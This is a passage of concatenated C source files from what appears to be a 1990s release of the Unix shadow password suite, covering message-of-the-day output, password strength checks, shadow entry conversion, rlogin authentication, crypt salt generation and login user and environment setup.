		puts ("No mail.");
	else if (statbuf.st_atime > statbuf.st_mtime)
		puts ("You have mail.");
	else
		puts ("You have new mail.");
}
/*
 * Copyright 1989 - 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: motd.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <stdio.h>
#include "defines.h"

extern	char	*getdef_str();

/*
 * motd -- output the /etc/motd file
 *
 * motd() determines the name of a login announcement file and outputs
 * it to the user's terminal at login time.  The MOTD_FILE configuration
 * option is a colon-delimited list of filenames.
 */

void
motd ()
{
	FILE	*fp;
	char	motdlist[BUFSIZ], *motdfile, *mb;
	register int	c;

	if ((mb = getdef_str("MOTD_FILE")) == NULL)
		return;

	strncpy(motdlist, mb, sizeof(motdlist));
	motdlist[sizeof(motdlist)-1] = '\0';

	for (mb = motdlist ; (motdfile = strtok(mb,":")) != NULL ; mb = NULL) {
		if ((fp = fopen(motdfile, "r")) != NULL) {
			while ((c = getc (fp)) != EOF)
				putchar (c);
			fclose (fp);
		}
	}
	fflush (stdout);
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: obscure.c,v 1.2 1996/09/10 02:45:13 marekm Exp $")

/*
 * This version of obscure.c contains modifications to support "cracklib"
 * by Alec Muffet (alec.muffett@uk.sun.com).  You must obtain the Cracklib
 * library source code for this function to operate.
 */

#include <ctype.h>
#include "prototypes.h"
#include "defines.h"

#include "getdef.h"

/*
 * can't be a palindrome - like `R A D A R' or `M A D A M'
 */

/*ARGSUSED*/
static int
palindrome(old, new)
	const char *old;
	const char *new;
{
	int	i, j;

	i = strlen (new);

	for (j = 0;j < i;j++)
		if (new[i - j - 1] != new[j])
			return 0;

	return 1;
}

/*
 * more than half of the characters are different ones.
 */

/*ARGSUSED*/
static int
similiar(old, new)
	const char *old;
	const char *new;
{
	int	i, j;

	for (i = j = 0;new[i] && old[i];i++)
		if (strchr (new, old[i]))
			j++;

	if (i >= j * 2)
		return 0;

	return 1;
}

/*
 * a nice mix of characters.
 */

/*ARGSUSED*/
static int
simple(old, new)
	const char *old;
	const char *new;
{
	int	digits = 0;
	int	uppers = 0;
	int	lowers = 0;
	int	others = 0;
	int	size;
	int	i;

	for (i = 0;new[i];i++) {
		if (isdigit (new[i]))
			digits++;
		else if (isupper (new[i]))
			uppers++;
		else if (islower (new[i]))
			lowers++;
		else
			others++;
	}

	/*
	 * The scam is this - a password of only one character type
	 * must be 8 letters long.  Two types, 7, and so on.
	 */

	size = 9;
	if (digits) size--;
	if (uppers) size--;
	if (lowers) size--;
	if (others) size--;

	if (size <= i)
		return 0;

	return 1;
}

static char *
str_lower(string)
	char *string;
{
	char *cp;

	for (cp = string; *cp; cp++)
		*cp = tolower(*cp);
	return string;
}

static char *
password_check(old, new, pwdp)
	const char *old;
	const char *new;
	const struct passwd *pwdp;
{
	char *msg = NULL;
	char *oldmono, *newmono, *wrapped;
#ifdef HAVE_LIBCRACK
	char *dictpath;
#ifdef HAVE_LIBCRACK_PW
	char *FascistCheckPw();
#else
	char *FascistCheck();
#endif
#endif

	if (strcmp(new, old) == 0)
		return "no change";

	newmono = str_lower(xstrdup(new));
	oldmono = str_lower(xstrdup(old));
	wrapped = xmalloc(strlen(oldmono) * 2 + 1);
	strcpy (wrapped, oldmono);
	strcat (wrapped, oldmono);

	if (palindrome(oldmono, newmono))
		msg = "a palindrome";

	if (!msg && strcmp(oldmono, newmono) == 0)
		msg = "case changes only";

	if (!msg && similiar(oldmono, newmono))
		msg = "too similiar";

	if (!msg && simple(old, new))
		msg = "too simple";

	if (!msg && strstr(wrapped, newmono))
		msg = "rotated";

#ifdef HAVE_LIBCRACK
	/*
	 * Invoke Alec Muffett's cracklib routines.
	 */

	if (!msg && (dictpath = getdef_str("CRACKLIB_DICTPATH")))
#ifdef HAVE_LIBCRACK_PW
		msg = FascistCheckPw(new, dictpath, pwdp);
#else
		msg = FascistCheck(new, dictpath);
#endif
#endif
	bzero(newmono, strlen(newmono));
	bzero(oldmono, strlen(oldmono));
	bzero(wrapped, strlen(wrapped));
	free(newmono);
	free(oldmono);
	free(wrapped);

	return msg;
}

/*ARGSUSED*/
char *
obscure_msg(old, new, pwdp)
	const char *old;
	const char *new;
	const struct passwd *pwdp;
{
	int maxlen, oldlen, newlen;
	char *new1, *old1, *msg;

	oldlen = strlen(old);
	newlen = strlen(new);

#if 0  /* why not check the password when set for the first time?  --marekm */
	if (old[0] == '\0')
		return (1);
#endif

	if ( newlen < getdef_num("PASS_MIN_LEN", 0) )
		return "too short";

	/*
	 * Remaining checks are optional.
	 */
	if (!getdef_bool("OBSCURE_CHECKS_ENAB"))
		return NULL;

	msg = password_check(old, new, pwdp);
	if (msg)
		return msg;

	/* The traditional crypt() truncates passwords to 8 chars.  It is
	   possible to circumvent the above checks by choosing an easy
	   8-char password and adding some random characters to it...
	   Example: "password$%^&*123".  So check it again, this time
	   truncated to the maximum length.  Idea from npasswd.  --marekm */

#ifdef MD5_CRYPT
	if (getdef_bool("MD5_CRYPT_ENAB"))
		return NULL;  /* unlimited password length */
#endif
	maxlen = getdef_num("PASS_MAX_LEN", 8);
	if (oldlen <= maxlen && newlen <= maxlen)
		return NULL;

	new1 = xstrdup(new);
	old1 = xstrdup(old);
	if (newlen > maxlen)
		new1[maxlen] = '\0';
	if (oldlen > maxlen)
		old1[maxlen] = '\0';

	msg = password_check(old1, new1, pwdp);

	bzero(new1, newlen);
	bzero(old1, oldlen);
	free(new1);
	free(old1);

	return msg;
}

/*
 * Obscure - see if password is obscure enough.
 *
 *	The programmer is encouraged to add as much complexity to this
 *	routine as desired.  Included are some of my favorite ways to
 *	check passwords.
 */

int
obscure(old, new, pwdp)
	const char *old;
	const char *new;
	const struct passwd *pwdp;
{
	char *msg = obscure_msg(old, new, pwdp);
	if (msg) {
		printf("Bad password: %s.  ", msg);
		return 0;
	}
	return 1;
}

/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifdef SHADOWPWD

#include "rcsid.h"
RCSID("$Id: pwd2spwd.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include "prototypes.h"
#include "defines.h"
#include <pwd.h>

extern	time_t	time ();

/*
 * pwd_to_spwd - create entries for new spwd structure
 *
 *	pwd_to_spwd() creates a new (struct spwd) containing the
 *	information in the pointed-to (struct passwd).
 */

struct spwd *
pwd_to_spwd(pw)
	const struct passwd *pw;
{
	static struct spwd sp;

	/*
	 * Nice, easy parts first.  The name and passwd map directly
	 * from the old password structure to the new one.
	 */
	sp.sp_namp = pw->pw_name;
	sp.sp_pwdp = pw->pw_passwd;

#ifdef ATT_AGE
	/*
	 * AT&T-style password aging maps the sp_min, sp_max, and
	 * sp_lstchg information from the pw_age field, which appears
	 * after the encrypted password.
	 */
	if (pw->pw_age[0]) {
		sp.sp_max = (c64i(pw->pw_age[0]) * WEEK) / SCALE;

		if (pw->pw_age[1])
			sp.sp_min = (c64i(pw->pw_age[1]) * WEEK) / SCALE;
		else
			sp.sp_min = (10000L * DAY) / SCALE;

		if (pw->pw_age[1] && pw->pw_age[2])
			sp.sp_lstchg = (a64l(pw->pw_age + 2) * WEEK) / SCALE;
		else
			sp.sp_lstchg = time((time_t *) 0) / SCALE;
	} else
#endif
	{
		/*
		 * Defaults used if there is no pw_age information.
		 */
		sp.sp_min = 0;
		sp.sp_max = (10000L * DAY) / SCALE;
		sp.sp_lstchg = time((time_t *) 0) / SCALE;
	}

	/*
	 * These fields have no corresponding information in the password
	 * file.  They are set to uninitialized values.
	 */
	sp.sp_warn = -1;
	sp.sp_expire = -1;
	sp.sp_inact = -1;
	sp.sp_flag = -1;

	return &sp;
}
#endif  /* SHADOWPWD */
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifdef RLOGIN

#include "rcsid.h"
RCSID("$Id: rlogin.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include "prototypes.h"
#include "defines.h"

#include <stdio.h>
#include <pwd.h>

extern int ruserok();

static struct {
	int	spd_name;
	int	spd_baud;
} speed_table [] = {
#ifdef B50
	{ B50, 50 },
#endif
#ifdef B75
	{ B75, 75 },
#endif
#ifdef B110
	{ B110, 110 },
#endif
#ifdef B134
	{ B134, 134 },
#endif
#ifdef B150
	{ B150, 150 },
#endif
#ifdef B200
	{ B200, 200 },
#endif
#ifdef B300
	{ B300, 300 },
#endif
#ifdef B600
	{ B600, 600 },
#endif
#ifdef B1200
	{ B1200, 1200 },
#endif
#ifdef B1800
	{ B1800, 1800 },
#endif
#ifdef B2400
	{ B2400, 2400 },
#endif
#ifdef B4800
	{ B4800, 4800 },
#endif
#ifdef B9600
	{ B9600, 9600 },
#endif
#ifdef B19200
	{ B19200, 19200 },
#endif
#ifdef B38400
	{ B38400, 38400 },
#endif
	{ -1,	-1 }
};

static void
get_remote_string (buf, size)
	char *buf;
	int size;
{
	for (;;) {
		if (read (0, buf, 1) != 1)
  			exit (1);
		if (*buf == '\0')
			return;
		if (--size > 0)
			++buf;
	}
	/*NOTREACHED*/
}

int
rlogin(remote_host, name, namelen, term, termlen)
	const char *remote_host;
	char *name;
	int namelen;
	char *term;
	int termlen;
{
	struct	passwd	*pwd;
	char	remote_name[32];
	char	*cp;
	int	remote_speed = 9600;
	int	speed_name = B9600;
	int	i;
	TERMIO	termio;

	get_remote_string (remote_name, sizeof remote_name);
	get_remote_string (name, namelen);
	get_remote_string (term, termlen);

	if ((cp = strchr (term, '/'))) {
		*cp++ = '\0';

		if (! (remote_speed = atoi (cp)))
			remote_speed = 9600;
	}
	for (i = 0;speed_table[i].spd_baud != remote_speed &&
				speed_table[i].spd_name != -1;i++)
		;

	if (speed_table[i].spd_name != -1)
		speed_name = speed_table[i].spd_name;

	/*
	 * Put the terminal in cooked mode with echo turned on.
	 */

	GTTY (0, &termio);
#ifndef	USE_SGTTY
	termio.c_iflag |= ICRNL|IXON;
	termio.c_oflag |= OPOST|ONLCR;
	termio.c_lflag |= ICANON|ECHO|ECHOE;
	termio.c_cflag = (termio.c_cflag & ~CBAUD) | speed_name;
#else
#endif
	STTY (0, &termio);

	if (! (pwd = getpwnam (name)))
		return 0;

	/*
	 * ruserok() returns 0 for success on modern systems, and 1 on
	 * older ones.  If you are having trouble with people logging
	 * in without giving a required password, THIS is the culprit -
	 * go fix the #define in config.h.
	 */

#ifndef	RUSEROK
	return 0;
#else
	return ruserok (remote_host, pwd->pw_uid == 0,
				remote_name, name) == RUSEROK;
#endif
}
#endif /* RLOGIN */
/*
 * salt.c - generate a random salt string for crypt()
 *
 * Written by Marek Michalkiewicz <marekm@i17linuxb.ists.pwr.wroc.pl>,
 * public domain.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: salt.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include "prototypes.h"
#include "defines.h"
#include <sys/time.h>

#ifdef MD5_CRYPT
#include "md5.h"
#include "getdef.h"

/*
 * Generate 8 base64 ASCII characters of random salt.  If MD5_CRYPT_ENAB
 * in /etc/login.defs is "yes", the salt string will be prefixed by "$1$"
 * (magic) and pw_encrypt() will execute the MD5-based FreeBSD-compatible
 * version of crypt() instead of the standard one.
 * TODO: use the Linux 1.3.xx random device?
 */
char *
crypt_make_salt()
{
	struct timeval tv;
	MD5_CTX ctx;
	static char result[16];
	char *cp = result;
	unsigned char tmp[16];
	int i;

	MD5Init(&ctx);

	gettimeofday(&tv, (struct timezone *) 0);
	MD5Update(&ctx, (void *) &tv, sizeof tv);

	i = getpid();
	MD5Update(&ctx, (void *) &i, sizeof i);

	i = clock();
	MD5Update(&ctx, (void *) &i, sizeof i);

	MD5Update(&ctx, result, sizeof result);

	MD5Final(tmp, &ctx);

	if (getdef_bool("MD5_CRYPT_ENAB")) {
		strcpy(cp, "$1$");  /* magic for the new crypt() */
		cp += strlen(cp);
	}
	/* generate 8 chars of salt, the old crypt() will use only first 2 */
	for (i = 0; i < 8; i++)
		*cp++ = i64c(tmp[i] & 077);
	*cp = '\0';
	return result;
}
#else

/*
 * This is the old style random salt generator...
 */
char *
crypt_make_salt()
{
	time_t now;
	static unsigned long x;
	static char result[3];

	time(&now);
	x += now + getpid() + clock();
	result[0] = i64c(((x >> 18) ^ (x >> 6)) & 077);
	result[1] = i64c(((x >> 12) ^ x) & 077);
	result[2] = '\0';
	return result;
}
#endif
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Separated from setup.c.  --marekm
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: setugid.c,v 1.2 1996/09/20 09:08:02 marekm Exp $")

#include <stdio.h>
#include <grp.h>

#include "prototypes.h"
#include "defines.h"
#include <pwd.h>

#include "getdef.h"

/*
 *	setup_uid_gid() performs the following steps -
 *
 *	set the supplementary group IDs
 *	optionally call specified function which may add more groups
 *	set the group ID to the value from the password file entry
 *	set the user ID to the value from the password file entry
 *
 *	Returns 0 on success, or -1 on failure.
 */

int
setup_uid_gid(info, is_console)
	const struct passwd *info;
	int is_console;
{
#ifdef HAVE_INITGROUPS
	/*
	 * For systems which support multiple concurrent groups, go get
	 * the group set from the /etc/group file.
	 */

	if (initgroups (info->pw_name, info->pw_gid) == -1) {
		perror("initgroups");
		SYSLOG((LOG_ERR, "initgroups failed for user `%s': %m\n",
			info->pw_name));
		closelog();
		return -1;
	}

#ifdef CONSOLE_GROUPS
	if (is_console) {
		char *cp = getdef_str("CONSOLE_GROUPS");
		if (cp && add_groups(cp))
			perror("Warning: add_groups");
	}
#endif

#endif /* HAVE_INITGROUPS */

	/*
	 * Set the real group ID to the primary group ID in the password
	 * file.
	 */

	if (setgid (info->pw_gid) == -1) {
		perror("setgid");
		SYSLOG((LOG_ERR, "bad group ID `%d' for user `%s': %m\n",
			info->pw_gid, info->pw_name));
		closelog();
		return -1;
	}

	/*
	 * Set the real UID to the UID value in the password file.
	 */

#ifndef	BSD
	if (setuid (info->pw_uid))
#else
	if (setreuid (info->pw_uid, info->pw_uid))
#endif
	{
		perror("setuid");
		SYSLOG((LOG_ERR, "bad user ID `%d' for user `%s': %m\n",
			info->pw_uid, info->pw_name));
		closelog();
		return -1;
	}

	return 0;
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: setup.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include "prototypes.h"
#include "defines.h"
#include <pwd.h>

/*
 * setup - initialize login environment
 *
 *	setup() performs the following steps -
 *
 *	set the process nice, ulimit, and umask from the password file entry
 *	set the group ID to the value from the password file entry
 *	set the supplementary group IDs
 *	set the user ID to the value from the password file entry
 *	change to the user's home directory
 *	set the HOME, SHELL, MAIL, PATH, and LOGNAME or USER environmental
 *	variables.
 */

void
setup (info)
	struct passwd *info;
{
	/*
	 * Set resource limits.
	 */
	setup_limits(info);

	/*
	 * Set the real group ID, do initgroups, and set the real user ID
	 * to the value in the password file.
	 */
	if (setup_uid_gid(info, 0))
		exit(1);

	/*
	 * Change to the home directory, and set up environment.
	 */
	setup_env(info);
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Separated from setup.c.  --marekm
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: setupenv.c,v 1.4 1996/09/25 03:19:56 marekm Exp $")

#include <sys/types.h>
#include <sys/stat.h>

#include <stdio.h>

#include "prototypes.h"
#include "defines.h"
#include <pwd.h>
#include "getdef.h"

static void
addenv_mail(maildir, mailfile)
	const char *maildir;
	const char *mailfile;
{
	char *buf;

	buf = xmalloc(strlen(maildir) + strlen(mailfile) + 2);
	sprintf(buf, "%s/%s", maildir, mailfile);
	addenv("MAIL", buf);
	free(buf);
}

/*
 *	change to the user's home directory
 *	set the HOME, SHELL, MAIL, PATH, and LOGNAME or USER environmental
 *	variables.
 */

void
setup_env(info)
	struct passwd *info;
{
	char *cp, *envf;
	char buf[1024];
	FILE *fp;

	/*
	 * Change the current working directory to be the home directory
	 * of the user.  It is a fatal error for this process to be unable
	 * to change to that directory.  There is no "default" home
	 * directory.
	 *
	 * We no longer do it as root - should work better on NFS-mounted
	 * home directories.  Some systems default to HOME=/, so we make
	 * this a configurable option.  --marekm
	 */

	if (chdir (info->pw_dir) == -1) {
		if (getdef_bool("DEFAULT_HOME") && chdir("/") == 0) {
			puts("No directory, logging in with HOME=/");
			info->pw_dir = "/";
		} else {
			fprintf(stderr, "Unable to cd to \"%s\"",
				info->pw_dir);
			SYSLOG((LOG_WARN,
				"unable to cd to `%s' for user `%s'\n",
				info->pw_dir, info->pw_name));
			closelog();
			exit (1);
		}
	}

	/*
	 * Create the HOME environmental variable and export it.
	 */

	addenv("HOME", info->pw_dir);

	/*
	 * Create the SHELL environmental variable and export it.
	 */

	if (info->pw_shell == (char *) 0 || ! *info->pw_shell)
		info->pw_shell = "/bin/sh";

	addenv("SHELL", info->pw_shell);

	/*
	 * Create the PATH environmental variable and export it.
	 */

	cp = getdef_str( info->pw_uid == 0 ? "ENV_SUPATH" : "ENV_PATH" );
	addenv(cp ? cp : "PATH=/bin:/usr/bin", NULL);

	/*
	 * Export the user name.  For BSD derived systems, it's "USER", for
	 * all others it's "LOGNAME".  We set both of them.
	 */

	addenv("USER", info->pw_name);
	addenv("LOGNAME", info->pw_name);

	/*
	 * Create the MAIL environmental variable and export it.  login.defs
	 * knows the prefix.
	 */

	if ((cp=getdef_str("MAIL_DIR")))
		addenv_mail(cp, info->pw_name);
	else if ((cp=getdef_str("MAIL_FILE")))
		addenv_mail(info->pw_dir, cp);
	else {
#if defined(MAIL_SPOOL_DIR)
		addenv_mail(MAIL_SPOOL_DIR, info->pw_name);
#elif defined(MAIL_SPOOL_FILE)
		addenv_mail(info->pw_dir, MAIL_SPOOL_FILE);
#endif
	}

	/*
	 * Read environment from optional config file.  --marekm
	 */
